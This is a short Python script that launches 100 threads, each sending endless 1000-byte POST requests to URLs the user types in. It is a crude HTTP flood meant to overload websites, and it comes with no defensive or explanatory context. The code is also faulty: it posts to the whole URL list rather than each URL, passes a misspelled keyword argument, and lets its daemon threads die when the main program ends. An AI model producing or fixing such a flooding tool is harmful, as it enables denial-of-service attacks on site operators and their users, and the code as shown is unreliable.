import requests as res
import threading

vector = input("url:\n").split(" ")
bye = bytes(10**3)

def start():
    while True:
        for i in vector:
            response = res.post(vector, data=bye, jason=None)
            print(response.text)
print("using post method to: ", vector)

threads = []

for i in range(100):
    thread = threading.Thread(target=start)
    thread.daemon = True  
    threads.append(thread)

for i in range(100): 
    threads[i].start()
